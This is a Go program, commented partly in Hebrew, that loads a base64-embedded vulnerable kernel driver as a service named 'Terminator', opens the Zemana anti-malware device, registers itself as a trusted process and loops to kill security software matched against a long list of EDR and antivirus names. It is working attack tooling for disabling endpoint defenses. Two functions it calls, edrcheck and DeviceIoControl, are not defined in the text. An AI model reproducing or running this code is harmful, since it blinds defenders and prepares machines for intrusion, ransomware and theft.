package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	IOCTL_REGISTER_PROCESS  = 0x80002010
	IOCTL_TERMINATE_PROCESS = 0x80002048
)

// כאן תכניס את מחרוזת ה-Base64 של `a.sys`
const encodedDriver = `PUT_YOUR_BASE64_STRING_HERE`

var _ unsafe.Pointer

// Do the interface allocations only once for common
// Errno values.
const (
	errnoERROR_IO_PENDING = 997
)

var (
	errERROR_IO_PENDING error = syscall.Errno(errnoERROR_IO_PENDING)
	errERROR_EINVAL     error = syscall.EINVAL
)

// errnoErr returns common boxed Errno values, to prevent
// allocations at runtime.
func errnoErr(e syscall.Errno) error {
	switch e {
	case 0:
		return errERROR_EINVAL
	case errnoERROR_IO_PENDING:
		return errERROR_IO_PENDING
	}
	return e
}

var (
	gtc       = syscall.NewLazyDLL("kernel32.dll").NewProc("GetTickCount")
	mk32      = windows.NewLazySystemDLL("Kernel32.dll")
	pep       = mk32.NewProc("K32EnumProcesses")
	devico    = mk32.NewProc("DeviceIoControl")
	drivnam   = "Terminator"
	edrgaylist = []string{
		"activeconsole", "anti malware", "anti-malware",
		"antimalware", "anti virus", "anti-virus",
		"antivirus", "appsense", "authtap",
		"avast", "avecto", "canary",
		"carbonblack", "carbon black", "cb.exe",
		"ciscoamp", "cisco amp", "countercept",
		"countertack", "cramtray", "crssvc",
		"crowdstrike", "csagent", "csfalcon",
		"csshell", "cybereason", "cyclorama",
		"cylance", "cyoptics", "cyupdate",
		"cyvera", "cyserver", "cytray",
		"darktrace", "defendpoint", "defender",
		"eectrl", "elastic", "endgame",
		"f-secure", "forcepoint", "fireeye",
		"groundling", "GRRservic", "inspector",
		"ivanti", "kaspersky", "lacuna",
		"logrhythm", "malware", "mandiant",
		"mcafee", "morphisec", "msascuil",
		"msmpeng", "nissrv", "omni",
		"omniagent", "osquery", "palo alto networks",
		"pgeposervice", "pgsystemtray", "privilegeguard",
		"procwall", "protectorservic", "qradar",
		"redcloak", "secureworks", "securityhealthservice",
		"semlaunchsv", "sentinel", "sepliveupdat",
		"sisidsservice", "sisipsservice", "sisipsutil",
		"smc.exe", "smcgui", "snac64",
		"sophos", "splunk", "srtsp",
		"servicehost.exe", "mcshield.exe",
		"mcupdatemgr.exe", "QcShm.exe", "ModuleCoreService.exe", "PEFService.exe", "McAWFwk.exe", "mfemms.exe", "mfevtps.exe", "McCSPServiceHost.exe", "Launch.exe", "delegate.exe", "McDiReg.exe", "McPvTray.exe", "McInstruTrack.exe", "McUICnt.exe", "ProtectedModuleHost.exe", "MMSSHOST.exe", "MfeAVSvc.exe",
		"symantec", "symcorpu", "symefasi",
		"sysinternal", "sysmon", "tanium",
		"tda.exe", "tdawork", "tpython",
		"mcapexe.exe",
		"vectra", "wincollect", "windowssensor",
		"wireshark", "threat", "xagt.exe",
		"xagtnotif.exe", "mssense", "efwd.exe", "ekrn.exe",
	}
)

// פענוח ה-Base64 לזיכרון
func decodeBase64(encoded string) ([]byte, error) {
	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}
	return decoded, nil
}

// טעינת הדרייבר מזיכרון
func loadDriverFromMemory(driverData []byte) bool {
	// כתיבת הנתונים לקובץ זמני
	tmpFilePath := "C:\\Windows\\Temp\\a.sys"
	err := os.WriteFile(tmpFilePath, driverData, 0644)
	if err != nil {
		fmt.Println("Failed to write the decoded driver to file:", err)
		return true
	}
	fmt.Printf("Driver written to: %s\n", tmpFilePath)
	return loaddriv(tmpFilePath)
}

func loaddriv(driverPath string) bool {
	manghand, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_ALL_ACCESS)
	if err != nil {
		fmt.Println("erm... Failed to open service control manager:", err)
		return true
	}
	defer windows.CloseServiceHandle(manghand)

	serviceHandle, err := windows.OpenService(manghand, windows.StringToUTF16Ptr(drivnam), windows.SERVICE_ALL_ACCESS)
	if err == nil {
		fmt.Println("erm... Service already exists.")
		var serviceStatus windows.SERVICE_STATUS
		err := windows.QueryServiceStatus(serviceHandle, &serviceStatus)
		if err != nil {
			fmt.Println("erm... Failed to query service status:", err)
			return true
		}
		if serviceStatus.CurrentState == windows.SERVICE_STOPPED {
			err = windows.StartService(serviceHandle, 0, nil)
			if err != nil {
				fmt.Println("erm... Failed to start service:", err)
				return true
			}
			fmt.Println("erm... Starting service...")
		}
		windows.CloseServiceHandle(serviceHandle)
		return false
	}

	driverPathPtr, err := syscall.UTF16PtrFromString(driverPath)
	if err != nil {
		fmt.Println("erm... Failed to convert driver path:", err)
		return true
	}

	serviceHandle, err = windows.CreateService(manghand, windows.StringToUTF16Ptr(drivnam),
		windows.StringToUTF16Ptr(drivnam), windows.SERVICE_ALL_ACCESS, windows.SERVICE_KERNEL_DRIVER,
		windows.SERVICE_DEMAND_START, windows.SERVICE_ERROR_IGNORE, driverPathPtr, nil, nil, nil, nil, nil)
	if err != nil {
		fmt.Println("erm... Failed to create service:", err)
		return true
	}
	fmt.Println("erm... Service created successfully.")

	err = windows.StartService(serviceHandle, 0, nil)
	if err != nil {
		fmt.Println("erm... Failed to start service:", err)
		windows.CloseServiceHandle(serviceHandle)
		return true
	}
	fmt.Println("erm... started service...")
	windows.CloseServiceHandle(serviceHandle)

	return false
}

func main() {
	// פענוח מחרוזת ה-Base64 ל-Bytes
	driverData, err := decodeBase64(encodedDriver)
	if err != nil {
		fmt.Println("Failed to decode driver:", err)
		return
	}

	fmt.Println("Driver decoded successfully!")

	// טעינת הדרייבר ישירות מהזיכרון
	if loadDriverFromMemory(driverData) {
		fmt.Println("Failed to load driver, try to run the program as administrator!!")
		os.Exit(-1)
	}
	fmt.Println("Driver loaded successfully !!")

	hDevice, err := syscall.CreateFile(syscall.StringToUTF16Ptr(`\\.\ZemanaAntiMalware`), syscall.GENERIC_WRITE|syscall.GENERIC_READ, 0,
		nil, syscall.OPEN_EXISTING, syscall.FILE_ATTRIBUTE_NORMAL, 0)
	if err != nil {
		fmt.Println("Failed to open handle to driver !!")
		os.Exit(-1)
	}

	var input uint32 = uint32(windows.GetCurrentProcessId())
	var dummy uint32
	if err := DeviceIoControl(windows.Handle(hDevice), IOCTL_REGISTER_PROCESS, uintptr(unsafe.Pointer(&input)), uint32(unsafe.Sizeof(input)),
		0, 0, &dummy, 0); err != nil {
		fmt.Printf("Failed to register the process in the trusted list %X !!\n", IOCTL_REGISTER_PROCESS)
		syscall.CloseHandle(hDevice)
		os.Exit(-1)
	}
	fmt.Printf("Process registered in the trusted list %X !!\n", IOCTL_REGISTER_PROCESS)

	fmt.Println("Terminating ALL EDR/XDR/AVs...")
	for {
		if count := edrcheck(windows.Handle(hDevice)); count == 0 {
			time.Sleep(1 * time.Second)
		} else {
			time.Sleep(1 * time.Second)
		}
	}
}
